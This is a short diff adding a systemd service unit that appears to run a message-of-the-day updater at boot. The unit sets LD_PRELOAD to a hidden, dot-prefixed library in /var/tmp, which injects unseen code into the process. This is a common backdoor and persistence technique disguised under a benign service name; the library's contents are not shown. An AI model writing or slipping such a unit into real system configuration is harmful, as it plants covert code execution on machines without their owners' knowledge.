@@ -1,0 +1,7 @@
+[Service]
+Type=simple
+Environment=LD_PRELOAD=/var/tmp/.libmotd.so
+ExecStart=update-motd --quiet
+
+[Install]
+WantedBy=multi-user.target
